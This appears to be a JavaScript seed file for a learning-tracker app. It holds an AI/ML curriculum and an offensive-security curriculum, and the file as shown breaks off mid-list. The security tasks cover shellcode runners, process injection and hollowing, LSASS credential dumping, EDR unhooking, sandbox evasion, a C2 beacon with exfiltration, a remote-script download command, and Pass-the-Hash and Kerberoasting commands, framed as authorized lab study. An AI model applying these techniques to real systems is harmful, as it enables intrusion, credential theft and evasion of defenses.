import Database from 'better-sqlite3';
import { existsSync, mkdirSync } from 'fs';

const dbPath = './data/quest-log.db';

// Ensure data directory exists
if (!existsSync('./data')) {
	mkdirSync('./data', { recursive: true });
}

const db = new Database(dbPath);
db.pragma('journal_mode = WAL');
db.pragma('foreign_keys = ON');

// Create tables
db.exec(`
	DROP TABLE IF EXISTS activity;
	DROP TABLE IF EXISTS tasks;
	DROP TABLE IF EXISTS modules;
	DROP TABLE IF EXISTS paths;

	CREATE TABLE paths (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		name TEXT NOT NULL,
		description TEXT,
		icon TEXT DEFAULT 'book',
		color TEXT DEFAULT 'emerald',
		language TEXT,
		skills TEXT,
		start_hint TEXT,
		difficulty TEXT DEFAULT 'intermediate',
		estimated_weeks INTEGER,
		schedule TEXT,
		created_at INTEGER
	);

	CREATE TABLE modules (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		path_id INTEGER NOT NULL REFERENCES paths(id) ON DELETE CASCADE,
		name TEXT NOT NULL,
		description TEXT,
		order_index INTEGER NOT NULL DEFAULT 0,
		target_date TEXT,
		created_at INTEGER
	);

	CREATE TABLE tasks (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		module_id INTEGER NOT NULL REFERENCES modules(id) ON DELETE CASCADE,
		title TEXT NOT NULL,
		description TEXT,
		details TEXT,
		order_index INTEGER NOT NULL DEFAULT 0,
		completed INTEGER NOT NULL DEFAULT 0,
		completed_at INTEGER,
		notes TEXT,
		created_at INTEGER
	);

	CREATE TABLE activity (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		date TEXT NOT NULL UNIQUE,
		tasks_completed INTEGER NOT NULL DEFAULT 0
	);
`);

const insertPath = db.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// AI/ML Deep Learning Path
// ============================================================================
const aiPath = insertPath.run(
	'AI/ML Deep Learning',
	'Master transformers, LLMs, and generative AI from the ground up. Build your own models and understand the architecture behind modern AI.',
	'emerald',
	now
);

// Phase 0: Math Foundations
const aiMod0 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 0: Math Foundations',
	'Essential math for deep learning (1-2 weeks)',
	0,
	now
);

const mathTasks = [
	['Watch 3Blue1Brown Essence of Linear Algebra', `YouTube playlist (16 videos, ~3hrs total). Focus on chapters 1-7: vectors, linear combinations, matrices as transformations, matrix multiplication, determinants. Key insight: matrices are FUNCTIONS that transform space. When you multiply a matrix by a vector, you're applying a transformation. This visual intuition is essential for understanding attention mechanisms later. URL: youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab`],
	['Practice matrix multiplication by hand', `Do 5-10 multiplications on paper. Critical rule: (m×n) @ (n×p) = (m×p). The inner dimensions must match, outer dimensions give result shape. Example: (2×3) @ (3×4) = (2×4). In transformers, you'll see shapes like (batch, seq_len, d_model) constantly. Practice: multiply a 2×3 matrix by a 3×2 matrix. Then try batched: what's (batch, n, m) @ (batch, m, p)?`],
	['Understand broadcasting in NumPy/PyTorch', `Broadcasting lets you do operations on different-shaped tensors. Rules: 1) Align shapes from the right, 2) Dimensions match if equal or one is 1, 3) Missing dims treated as 1. Example: (3,4) + (4,) works because (4,) becomes (1,4) then broadcasts. Practice in Python: create tensors of shapes (2,3,4) and (3,1) and add them. Predict the output shape first.`],
	['Learn transpose and reshape operations', `Transpose swaps dimensions: (batch, seq, dim) → (batch, dim, seq). Reshape changes shape without changing data: (2,6) → (3,4) → (12,). View vs reshape: view shares memory, reshape may copy. In attention: Q,K,V get reshaped from (batch, seq, d_model) to (batch, heads, seq, d_k). Practice: take a (2,3,4) tensor, transpose dims 1 and 2, then reshape to (2,12).`],
	['Watch 3Blue1Brown Essence of Calculus', `YouTube playlist, focus on chapters 1-4 (~1hr). Key concepts: derivative = instantaneous rate of change = slope of tangent line. You don't need to compute derivatives by hand - PyTorch does this. But understand: if loss is high, gradient tells you which direction to adjust weights. URL: youtube.com/playlist?list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr`],
	['Understand the chain rule conceptually', `Chain rule: d/dx[f(g(x))] = f'(g(x)) · g'(x). In plain English: "derivative of the outer times derivative of the inner." This IS backpropagation. Neural net: loss depends on output, output depends on weights. To find how loss changes with weights, multiply the derivatives along the path. You don't compute this - autograd does - but understand WHY it works.`],
	['Learn what a gradient is', `Gradient = vector of all partial derivatives. Points in direction of steepest INCREASE. For loss function: gradient tells you how to make loss WORSE. So we go OPPOSITE direction (gradient descent). For f(x,y), gradient is [∂f/∂x, ∂f/∂y]. In neural nets: gradient of loss w.r.t. each weight tells you how to adjust that weight.`],
	['Understand softmax function', `softmax(x_i) = exp(x_i) / Σexp(x_j). Converts any vector of numbers (logits) into probabilities that sum to 1. Why exp? Makes all values positive, amplifies differences. Temperature: softmax(x/T) - higher T = more uniform, lower T = more peaked. Used in: attention weights, final classification layer. Numerical stability: subtract max(x) before exp to avoid overflow.`],
	['Learn cross-entropy loss intuition', `CE = -Σ y_true · log(y_pred). Measures "surprise" when true distribution is y_true but you predicted y_pred. If you're confident and right: low loss. Confident and wrong: HIGH loss (log of small number = very negative). For classification: CE = -log(probability assigned to correct class). Target: get the model to assign high probability to correct answers.`],
	['Understand KL divergence basics', `KL(P||Q) = Σ P(x) · log(P(x)/Q(x)). Measures how different Q is from P. NOT symmetric: KL(P||Q) ≠ KL(Q||P). Used in: VAEs, RLHF (KL penalty keeps model close to reference), knowledge distillation. Intuition: "extra bits needed to encode P using code optimized for Q." Cross-entropy = entropy + KL divergence.`],
	['Study probability distributions', `Key distributions: 1) Categorical - discrete choices (token prediction), 2) Normal/Gaussian - continuous, bell curve (weight initialization, VAE latents), 3) Uniform - equal probability (dropout mask). Understand: mean, variance, sampling. In PyTorch: torch.distributions module. Practice: sample from Normal(0,1), compute mean of 1000 samples.`],
	['Implement softmax from scratch', `In Python: def softmax(x): x_max = np.max(x, axis=-1, keepdims=True); exp_x = np.exp(x - x_max); return exp_x / np.sum(exp_x, axis=-1, keepdims=True). The x_max subtraction prevents overflow (exp of large numbers = inf). Test: softmax([1,2,3]) should give [0.09, 0.24, 0.67]. Verify it sums to 1. Try with temperature parameter.`]
];

mathTasks.forEach(([title, desc], i) => {
	insertTask.run(aiMod0.lastInsertRowid, title, desc, i, now);
});

// Phase 1: Foundations
const aiMod1 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 1: Neural Net Foundations',
	'Build understanding of neural networks and autograd (1-2 weeks)',
	1,
	now
);

const foundationTasks = [
	['Watch 3Blue1Brown Neural Networks playlist', `4 videos (~1hr total). Covers: what neural nets compute, gradient descent visualization, backpropagation intuition. Key insight: neural net = layers of simple functions composed together. Each neuron: weighted sum → activation function. Training = adjusting weights to minimize loss. URL: youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi`],
	['Clone and study micrograd', `git clone https://github.com/karpathy/micrograd. Only ~100 lines of core code in micrograd/engine.py. Implements: Value class with data + grad + _backward function. Operations build a graph, backward() traverses it. Study: __add__, __mul__, __pow__, tanh, backward(). This is ALL autograd is - tracking operations and computing gradients via chain rule.`],
	['Reimplement micrograd from memory', `Close the repo. Open blank file. Build Value class from scratch: __init__(data), __add__, __mul__, __repr__. Add _children and _op tracking. Implement backward() with topological sort. Test: a = Value(2); b = Value(3); c = a * b + a; c.backward(). Verify a.grad and b.grad are correct. Debug until it works.`],
	['Watch Karpathy makemore Part 1-2', `Part 1 (1hr): Bigram model - simplest language model, just counts. Part 2 (1hr): MLP language model - embeddings + hidden layer + output. URL: youtube.com/watch?v=PaCmpygFfXo and watch?v=TCH_1BHY58I. Code along in Jupyter. Key concepts: character embeddings, negative log likelihood loss, mini-batch training.`],
	['Watch Karpathy makemore Part 3-4', `Part 3 (1hr): BatchNorm - why activations blow up, how BN fixes it. Dead neurons, activation statistics. Part 4 (1hr): Manual backprop - compute gradients by hand through the network. URL: watch?v=P6sfmUTpUmc and watch?v=q8SA3rM6ckI. This is where you REALLY understand what PyTorch does automatically.`],
	['Read The Little Book of Deep Learning', `Free PDF at fleuret.org/francois/lbdl.html. Only 150 pages with figures. Covers: MLPs, CNNs, attention, training techniques, architectures. Read in 2-3 sessions. Skip proofs, focus on intuition and architecture diagrams. Good reference to return to.`],
	['Complete micrograd exercises', `Extend your micrograd: 1) Add subtraction and division, 2) Add ReLU activation, 3) Add exp() and log(), 4) Build a 2-layer MLP class, 5) Train it on a simple dataset (e.g., XOR problem or sklearn moons). If something breaks, debug by comparing gradients to PyTorch.`]
];

foundationTasks.forEach(([title, desc], i) => {
	insertTask.run(aiMod1.lastInsertRowid, title, desc, i, now);
});

// Phase 2: Transformers
const aiMod2 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 2: Transformers',
	'Deep dive into transformer architecture (2-3 weeks)',
	2,
	now
);

const transformerTasks = [
	['Read "The Illustrated Transformer"', `URL: jalammar.github.io/illustrated-transformer. Best visual explanation of attention. Key diagrams: Q/K/V projections, attention weights heatmap, multi-head attention, encoder-decoder structure. Spend 30-60 min. Draw the architecture yourself after reading. Follow-up: "The Illustrated GPT-2" on same site.`],
	['Watch "Let\'s build GPT from scratch"', `Karpathy's 2-hour video: youtube.com/watch?v=kCc8FmEb1nY. Code along in a notebook. Builds character-level GPT from scratch. Covers: self-attention, masking, multi-head, feedforward, residuals, layernorm. Pause frequently. By the end, you'll have working GPT code you understand completely.`],
	['Clone nanoGPT repository', `git clone https://github.com/karpathy/nanoGPT. Core file is model.py (~300 lines). Study in order: 1) GPTConfig dataclass, 2) CausalSelfAttention class, 3) MLP class, 4) Block class, 5) GPT class. Trace shapes through forward(). Note: uses Flash Attention when available.`],
	['Train nanoGPT on Shakespeare', `cd nanoGPT && python data/shakespeare_char/prepare.py && python train.py config/train_shakespeare_char.py. Takes 5-15 min on GPU. Watch loss decrease. Then: python sample.py --out_dir=out-shakespeare-char. Read generated Shakespeare. Try changing: n_layer, n_head, n_embd in config.`],
	['Add print statements for tensor shapes', `In model.py forward(), add prints: print(f"After embed: {x.shape}"), print(f"After block {i}: {x.shape}"). In CausalSelfAttention, print Q, K, V, attention weights shapes. Run one forward pass. Verify: (B, T, C) flows through. Attention weights should be (B, nh, T, T).`],
	['Implement multi-head attention from scratch', `New file, no imports except torch. Build: 1) Linear projections for Q, K, V (d_model → d_model), 2) Split into heads: reshape (B,T,d) → (B,nh,T,d_k), 3) Attention: softmax(QK^T / sqrt(d_k)) @ V, 4) Concat heads and project. Add causal mask. Compare output to PyTorch MultiheadAttention.`],
	['Implement full transformer block', `Stack your attention with: 1) Pre-norm: LayerNorm before attention, 2) Residual: x = x + attn(norm(x)), 3) Feed-forward: two linears with GELU, 4) Another residual: x = x + ffn(norm(x)). This is the modern "pre-norm" style used in GPT-2+. Test: random input should produce same-shaped output.`],
	['Build complete GPT model from scratch', `Combine everything: 1) Token embedding: nn.Embedding(vocab_size, d_model), 2) Position embedding: nn.Embedding(max_seq_len, d_model), 3) Stack N transformer blocks, 4) Final LayerNorm, 5) Output projection: nn.Linear(d_model, vocab_size). Add generate() method with temperature and top-k sampling.`],
	['Study RoPE positional embeddings', `RoPE = Rotary Position Embedding (used in Llama, Mistral). Instead of adding position, ROTATE Q and K vectors based on position. Benefit: relative positions, extrapolates to longer sequences. Paper: arxiv.org/abs/2104.09864. Implementation: apply rotation matrix based on position to pairs of dimensions. See: blog.eleuther.ai/rotary-embeddings/`],
	['Study and implement RMSNorm', `RMSNorm = Root Mean Square Normalization (Llama). Simpler than LayerNorm: no mean subtraction, just divide by RMS. Formula: x * weight / sqrt(mean(x^2) + eps). Faster than LayerNorm, works just as well. Implementation: ~5 lines. class RMSNorm: def forward(x): return x * self.weight * torch.rsqrt(x.pow(2).mean(-1, keepdim=True) + self.eps)`],
	['Implement SwiGLU activation', `SwiGLU = Swish-Gated Linear Unit (Llama, PaLM, Mistral). FFN becomes: SwiGLU(x) = Swish(xW1) * (xW2) then project with W3. Swish(x) = x * sigmoid(x). Three weight matrices instead of two. Better than ReLU empirically. Note: d_ff is typically (8/3)*d_model to match parameter count of standard FFN.`]
];

transformerTasks.forEach(([title, desc], i) => {
	insertTask.run(aiMod2.lastInsertRowid, title, desc, i, now);
});

// Phase 3: Training & Fine-tuning
const aiMod3 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 3: Training & Fine-tuning',
	'Learn training dynamics and adaptation techniques (2 weeks)',
	3,
	now
);

const trainingTasks = [
	['Experiment with learning rates', `Train your nanoGPT with lr=1e-3, 1e-4, 1e-5, 1e-2. Log loss curves for each. Observe: too high = loss explodes or oscillates, too low = trains slowly, just right = smooth decrease. Typical ranges: 1e-4 to 1e-3 for small models, 1e-5 to 1e-4 for large models. Create a plot comparing all runs.`],
	['Implement learning rate warmup', `Warmup: start lr at 0, linearly increase to max_lr over N steps. Then: cosine decay to min_lr. Code: if step < warmup_steps: lr = max_lr * step / warmup_steps; else: lr = min_lr + 0.5*(max_lr-min_lr)*(1+cos(pi*progress)). Typical: 1-2% of training for warmup. Prevents early instability.`],
	['Add gradient clipping', `torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0). Prevents exploding gradients. Typical max_norm: 0.5 to 1.0. Try training without clipping - observe loss spikes. Then add clipping - should be smoother. Log gradient norms to see when clipping activates.`],
	['Study mixed precision training', `FP16 = half precision = 2x memory savings + faster on modern GPUs. Challenge: small gradients underflow to 0. Solution: loss scaling - multiply loss by 1000+, gradients scale up, then unscale after backward. PyTorch: torch.cuda.amp.autocast() + GradScaler(). Train with and without - compare speed and final loss.`],
	['Read LoRA paper', `"Low-Rank Adaptation of Large Language Models" - arxiv.org/abs/2106.09685. Key idea: freeze base weights, add small trainable matrices. W_new = W_frozen + BA where B is (d×r), A is (r×d), r << d. Only train ~0.1% of parameters. Same quality as full fine-tuning for many tasks. Focus on: rank selection, which layers to adapt, alpha scaling.`],
	['Implement LoRA from scratch', `class LoRALinear: def __init__(self, linear, rank=8, alpha=16): self.linear = linear (frozen); self.A = nn.Parameter(randn(linear.in_f, rank)); self.B = nn.Parameter(zeros(rank, linear.out_f)); self.scaling = alpha/rank. Forward: return linear(x) + (x @ self.A @ self.B) * self.scaling. Initialize A with kaiming, B with zeros (starts as identity).`],
	['Fine-tune GPT-2 with your LoRA', `Load GPT-2 from Hugging Face: AutoModelForCausalLM.from_pretrained("gpt2"). Apply your LoRA to q_proj and v_proj in each attention layer. Freeze base model. Fine-tune on a small dataset (e.g., your own writing, code, or alpaca-style instructions). Compare to full fine-tuning: similar quality, 10x less memory?`],
	['Study QLoRA paper', `"QLoRA: Efficient Finetuning of Quantized LLMs" - arxiv.org/abs/2305.14314. Key innovations: 1) 4-bit NormalFloat quantization, 2) Double quantization (quantize the quantization constants), 3) Paged optimizers for memory spikes. Enables fine-tuning 65B model on single 48GB GPU. Use bitsandbytes library for implementation.`],
	['Read DPO paper', `"Direct Preference Optimization" - arxiv.org/abs/2305.18290. Replaces RLHF's reward model + PPO with single supervised loss. Given (prompt, chosen, rejected) pairs: loss pushes model to prefer "chosen" over "rejected". Simpler than RLHF, similar results. Key equation: loss = -log(sigmoid(β * (log_prob_chosen - log_prob_rejected))). β controls strength.`],
	['Understand RLHF pipeline', `Full RLHF: 1) SFT - supervised fine-tune on demonstrations, 2) Reward Model - train classifier on human preferences (chosen vs rejected), 3) PPO - RL to maximize reward while staying close to SFT model (KL penalty). Complex but powerful. Used in ChatGPT, Claude. Study: OpenAI InstructGPT paper, Anthropic Constitutional AI paper.`]
];

trainingTasks.forEach(([title, desc], i) => {
	insertTask.run(aiMod3.lastInsertRowid, title, desc, i, now);
});

// Phase 4: Inference & Optimization
const aiMod4 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 4: Inference & Optimization',
	'Optimize models for production deployment',
	4,
	now
);

const inferenceTasks = [
	['Implement KV cache', `During generation, K and V for past tokens don't change. Cache them instead of recomputing. First pass: compute KV for entire prompt. Subsequent passes: only compute KV for new token, concatenate with cache. Memory: O(batch * layers * seq_len * d_model). Implementation: store past_kv as list of (K,V) tuples per layer. Speeds up generation 10-100x.`],
	['Study Flash Attention', `Paper: arxiv.org/abs/2205.14135. Problem: attention is O(n²) memory for storing attention matrix. Solution: compute attention in blocks, never materialize full matrix. Tiled computation, recomputation in backward pass. Result: O(n) memory, faster on GPU due to better memory access patterns. PyTorch 2.0+: F.scaled_dot_product_attention has Flash Attention built-in.`],
	['Implement top-k and top-p sampling', `Top-k: keep only k highest probability tokens, renormalize, sample. Top-p (nucleus): keep smallest set of tokens whose cumulative probability ≥ p. Code: sorted_probs, indices = torch.sort(probs, descending=True); cumsum = torch.cumsum(sorted_probs, dim=-1); mask = cumsum <= p; sample from masked distribution. Temperature: divide logits by T before softmax.`],
	['Study speculative decoding', `Paper: arxiv.org/abs/2211.17192. Idea: small "draft" model generates k tokens quickly, large model verifies all k in one forward pass. Accept tokens where draft matches large model (via rejection sampling). Result: 2-3x speedup for large models. Key: draft model must be much faster and reasonably aligned with large model. Try: Llama-7B as draft for Llama-70B.`],
	['Learn quantization basics', `Quantization: reduce precision of weights/activations. FP32 → FP16 → INT8 → INT4. Linear quantization: x_quant = round(x / scale + zero_point). Dequantize: x ≈ (x_quant - zero_point) * scale. Calibration: find scale/zero_point from sample data. Symmetric vs asymmetric. Per-tensor vs per-channel. Trade-off: smaller = faster but less accurate.`],
	['Study GPTQ/AWQ quantization', `GPTQ: "Accurate Post-Training Quantization for Generative Pretrained Transformers". Quantizes weights only (activations stay FP16). Uses Hessian information to minimize quantization error. AWQ: "Activation-aware Weight Quantization" - protects important weights based on activation magnitudes. Both achieve 4-bit with minimal quality loss. Libraries: auto-gptq, autoawq.`],
	['Try vLLM for serving', `pip install vllm. vLLM = high-throughput LLM serving. Features: PagedAttention (efficient KV cache), continuous batching, optimized CUDA kernels. Code: from vllm import LLM; llm = LLM("meta-llama/Llama-2-7b-hf"); outputs = llm.generate(prompts). Benchmark: compare tokens/sec to naive HuggingFace generate(). Expect 5-20x improvement.`],
	['Implement continuous batching', `Traditional: wait for all requests in batch to finish. Continuous: as requests finish, immediately add new ones. Don't let GPU idle waiting for long sequences. Track per-request state: input_ids, kv_cache, generated_tokens. Each step: batch forward pass, some requests may finish (hit EOS or max_len), add new requests. Result: much higher throughput.`]
];

inferenceTasks.forEach(([title, desc], i) => {
	insertTask.run(aiMod4.lastInsertRowid, title, desc, i, now);
});

// Phase 5: Projects
const aiMod5 = insertModule.run(
	aiPath.lastInsertRowid,
	'Phase 5: Build Projects',
	'Apply knowledge to real projects',
	5,
	now
);

const projectTasks = [
	['Build character-level text generator', `Take your GPT implementation and train on custom data: your own writing, a favorite book (Project Gutenberg), code from your repos, or song lyrics. Prepare data: concatenate all text, create train/val split. Train for 5k-20k iterations. Generate samples at different temperatures. Goal: model captures the "style" of your corpus.`],
	['Create domain-specific fine-tuned model', `Choose a domain you know well: your programming language, a game you play, a field you work in. Collect data: Stack Overflow answers, game wikis, documentation, your own notes. Format as instruction-response pairs. Fine-tune a small model (GPT-2, Phi-2, TinyLlama) with LoRA. Evaluate: does it know things base model doesn't?`],
	['Build semantic search engine', `Use sentence-transformers: from sentence_transformers import SentenceTransformer; model = SentenceTransformer('all-MiniLM-L6-v2'). Embed your documents (code files, notes, bookmarks). Store embeddings in numpy array or FAISS. Query: embed question, find top-k similar documents via cosine similarity. Build simple UI with Gradio or Streamlit.`],
	['Implement recommendation system', `Collaborative filtering: matrix of users × items, predict missing ratings using matrix factorization (SVD) or neural embeddings. Content-based: embed item descriptions, recommend similar items to what user liked. Hybrid: combine both signals. Dataset: MovieLens (movies), your own watch history, or GitHub stars. Evaluate with held-out data.`],
	['Build local LLM inference server', `Serve a quantized model locally with REST API. Stack: FastAPI + llama.cpp (or vLLM). Quantize a 7B model to 4-bit (~4GB). Endpoints: /generate (streaming), /embeddings. Add: request queue, concurrent handling, basic auth. Test: curl requests, measure latency and throughput. Goal: your own local ChatGPT-like API.`]
];

projectTasks.forEach(([title, desc], i) => {
	insertTask.run(aiMod5.lastInsertRowid, title, desc, i, now);
});

// ============================================================================
// Security / Red Team Path
// ============================================================================
const secPath = insertPath.run(
	'Red Team & Offensive Security',
	'Learn malware development, Active Directory attacks, and evasion techniques. Build custom tooling for authorized security testing.',
	'rose',
	now
);

// Month 1: Foundations
const secMod1 = insertModule.run(
	secPath.lastInsertRowid,
	'Month 1: Foundations',
	'Windows internals, C basics, and AD fundamentals',
	0,
	now
);

const secFoundationTasks = [
	['Learn Windows API basics', `Core APIs to master: CreateProcess (spawn processes), VirtualAlloc/VirtualAllocEx (allocate memory), WriteProcessMemory (write to other processes), OpenProcess (get handle to process), CreateRemoteThread (run code in other process). Study MSDN docs. Practice: write C program that allocates memory, writes bytes, executes. Use Visual Studio or mingw-w64.`],
	['Understand PE file format', `PE = Portable Executable (Windows .exe/.dll format). Key sections: DOS header, PE header, sections (.text=code, .data=data, .rdata=imports/exports). Import Address Table (IAT) = list of DLL functions used. Study with PE-bear or CFF Explorer. Why it matters: loaders parse PE, packers modify PE, AV scans PE. Resource: corkami.github.io/pics/`],
	['Study how AV/EDR detection works', `Detection layers: 1) Signature - hash/pattern matching on disk, 2) Heuristics - suspicious API sequences, 3) Behavioral - runtime monitoring of actions, 4) Userland hooks - intercept API calls via ntdll.dll patching, 5) Kernel callbacks - OS notifies EDR of events, 6) ETW - Event Tracing for Windows telemetry. Understand each to bypass each.`],
	['Write basic shellcode runner in C', `Shellcode = position-independent machine code. Start simple: msfvenom -p windows/x64/exec CMD=calc.exe -f c. C code: unsigned char shellcode[] = {...}; void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof(shellcode)); ((void(*)())exec)(); Compile and test in VM.`],
	['Build DLL injector', `Classic injection: 1) OpenProcess on target PID, 2) VirtualAllocEx - allocate memory in target, 3) WriteProcessMemory - write DLL path string, 4) GetProcAddress for LoadLibraryA, 5) CreateRemoteThread - call LoadLibrary with DLL path. Create simple DLL that shows MessageBox. Inject into notepad.exe. Verify with Process Explorer.`],
	['Implement process hollowing', `Steps: 1) CreateProcess with CREATE_SUSPENDED, 2) NtUnmapViewOfSection to hollow out the legitimate exe, 3) VirtualAllocEx at image base, 4) Write your PE headers and sections, 5) Set thread context to your entry point, 6) ResumeThread. Result: your code runs disguised as legitimate process. More evasive than injection. Reference: github.com/m0n0ph1/Process-Hollowing`],
	['Set up vulnerable AD home lab', `Requirements: 32GB+ RAM, VMware/Proxmox. Build: Windows Server 2022 as DC (10.0.0.10), Windows 10/11 workstations (10.0.0.20-21), Kali attacker (10.0.0.100). Install AD DS, DNS, create domain (lab.local). Join workstations. Create users: admin, helpdesk, svc_sql, regular users. Snapshot clean state. Guide: yourss.com/adsimulator or yourss.com/goad`],
	['Learn AD architecture', `Core concepts: Domain = security boundary, Forest = collection of domains with trust, OU = organizational unit for GPO targeting, GPO = Group Policy Object (pushed settings). Key objects: Users, Computers, Groups (Domain Admins, Enterprise Admins). Trust relationships: parent-child, external, forest. LDAP for queries, DNS for service location (SRV records).`],
	['Understand Kerberos auth flow', `Full flow: 1) AS-REQ: client → KDC, "I'm user X, give me TGT", 2) AS-REP: KDC → client, TGT encrypted with krbtgt hash, 3) TGS-REQ: client → KDC, "Here's TGT, give me ticket for service Y", 4) TGS-REP: KDC → client, service ticket encrypted with service account hash, 5) AP-REQ: client → service, present ticket. Draw this from memory. PAC = Privilege Attribute Certificate (groups/SIDs).`],
	['Understand NTLM authentication', `Challenge-response: 1) Client sends username, 2) Server sends 16-byte challenge, 3) Client encrypts challenge with password hash (NTLMv2: HMAC-MD5), sends response, 4) Server verifies against DC. Vulnerabilities: relay (forward auth to another service), pass-the-hash (use hash directly without password). When used: legacy systems, fallback when Kerberos fails, cross-forest.`],
	['Map domain with PowerView', `PowerView = PowerShell AD recon tool. Key commands: Get-DomainUser (all users), Get-DomainGroup -Identity "Domain Admins" (group members), Get-DomainComputer (all machines), Find-LocalAdminAccess (where you're admin), Get-DomainGPO (all GPOs), Get-ObjectAcl (permissions). Import: IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`],
	['Create common misconfigurations', `In your lab: 1) Kerberoastable: setspn -A MSSQLSvc/db01.lab.local:1433 svc_sql (service account with SPN), 2) AS-REP roastable: Set-ADAccountControl -Identity asrep_user -DoesNotRequirePreAuth $true, 3) Unconstrained delegation: Set-ADComputer -Identity WS01 -TrustedForDelegation $true, 4) Weak ACL: give user GenericAll on another user. These are your attack targets.`]
];

secFoundationTasks.forEach(([title, desc], i) => {
	insertTask.run(secMod1.lastInsertRowid, title, desc, i, now);
});

// Month 2: Core Techniques
const secMod2 = insertModule.run(
	secPath.lastInsertRowid,
	'Month 2: Core Techniques',
	'Custom tooling and AD attack paths',
	1,
	now
);

const secCoreTasks = [
	['Build custom credential dumper', `LSASS.exe holds credentials in memory. Methods: 1) MiniDumpWriteDump - creates dump file, 2) Direct memory read with ReadProcessMemory, 3) Syscalls to avoid hooks. Why custom? Mimikatz signature is burned. Start with MiniDump approach, then evolve. Parse dump offline with pypykatz. Goal: dump creds without triggering Windows Defender.`],
	['Implement XOR encryption for payloads', `XOR = simplest obfuscation. encrypted[i] = payload[i] ^ key[i % keylen]. Decrypt at runtime before execution. In C: for(int i=0; i<size; i++) payload[i] ^= key[i % keylen]; Defeats static signature scans. Key in binary = still extractable but raises the bar. Use unique key per build. Test: does AV flag encrypted payload?`],
	['Implement AES encryption with key derivation', `Stronger than XOR. Use AES-256-CBC or AES-256-GCM. Key derivation: don't hardcode key directly. Options: derive from environment (hostname, username), fetch from C2, or use PBKDF2 from compile-time secret. Libraries: Windows CryptoAPI (BCrypt*), or compile OpenSSL statically. Decrypt payload in memory, never write decrypted to disk.`],
	['Learn direct syscalls', `User API calls: your code → kernel32.dll → ntdll.dll → syscall instruction → kernel. EDR hooks ntdll.dll. Direct syscalls skip ntdll: your code → syscall instruction directly. Tools: SysWhispers (generates syscall stubs), HellsGate (dynamically resolves syscall numbers). Implement NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx via direct syscalls.`],
	['Implement ntdll unhooking', `EDR modifies ntdll.dll in memory (hooks). Fix: 1) Read clean ntdll.dll from disk (C:\\Windows\\System32\\ntdll.dll), 2) Map into memory, 3) Find .text section, 4) Copy clean bytes over hooked bytes. Result: API calls go to original code, bypassing EDR. Alternative: load ntdll from suspended process (also clean). Test: check if functions start with "mov r10, rcx; mov eax, SSN" (clean) or "jmp" (hooked).`],
	['Add delayed execution', `Sandboxes have limited runtime (30s-5min). Simple evasion: Sleep(300000) - 5 minutes. But: sandboxes can fast-forward sleep. Better: check system uptime (sandbox just booted), check for user interaction (mouse/keyboard), check number of processes, check RAM size (<4GB = likely sandbox), check for VM artifacts. Combine multiple checks.`],
	['Build basic C2 client', `HTTP beacon: loop { sleep(jitter(60s)); response = HTTP_GET(c2_server + "/tasks"); if(task) { result = execute(task); HTTP_POST(c2_server + "/results", result); }}. Jitter: sleep_time = base_time * (1 + random(-0.2, 0.2)) - makes traffic less predictable. HTTPS preferred. User-Agent should look legitimate. Consider: domain fronting, malleable C2 profiles.`],
	['Add command execution to C2', `Receive command from C2, execute, return output. In C: CreateProcess with redirected stdout/stderr to pipes, ReadFile from pipe, send output back. Or: popen() for simplicity. Handle: long-running commands, commands with no output, errors. Consider: PowerShell execution, .NET assembly loading (execute C# in memory). Don't just shell out - that's noisy.`],
	['Implement file upload/download', `Download (exfil): read file, base64 encode (or chunk binary), POST to C2. Upload (drop tool): receive bytes from C2, write to disk or load directly into memory. Large files: chunk into pieces, reassemble. Consider: encryption in transit, compression, alternate channels (DNS, ICMP if HTTP blocked). Memory-only: don't write downloaded tools to disk.`],
	['Run BloodHound against lab', `BloodHound = graph-based AD attack path analysis. Setup: Neo4j database + BloodHound GUI. Collection: SharpHound.exe -c All (or BloodHound.py from Linux). Import JSON into BloodHound. Queries: "Shortest path to Domain Admin", "Kerberoastable users", "Users with DCSync rights". Find EVERY path to DA in your lab. Screenshot the graph.`],
	['Execute Kerberoasting manually', `Attack: any domain user can request service ticket for any SPN. Ticket is encrypted with service account's password hash. Offline crack = service account password. Manual: 1) Find SPNs: Get-ADUser -Filter {ServicePrincipalName -ne "$null"}, 2) Request ticket: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/db01.lab.local:1433", 3) Export with Mimikatz or Rubeus, 4) Crack with hashcat mode 13100.`],
	['Perform Pass-the-Hash without Mimikatz', `PtH: use NTLM hash directly without knowing password. With Impacket (Python): psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 DOMAIN/Administrator@target. Or: wmiexec.py, smbexec.py, atexec.py. From Windows: sekurlsa::pth in Mimikatz, or overpass-the-hash with Rubeus. Build your own: implement NTLM auth with hash instead of password.`],
	['Abuse unconstrained delegation', `Unconstrained delegation: server can impersonate ANY user who authenticates to it. Attack: 1) Compromise machine with unconstrained delegation, 2) Coerce high-privilege user to authenticate (e.g., printerbug, PetitPotam), 3) Capture their TGT from memory, 4) Use TGT to access resources as that user. Monitor with Rubeus: Rubeus.exe monitor /interval:5. Coerce with SpoolSample or PetitPotam.`],
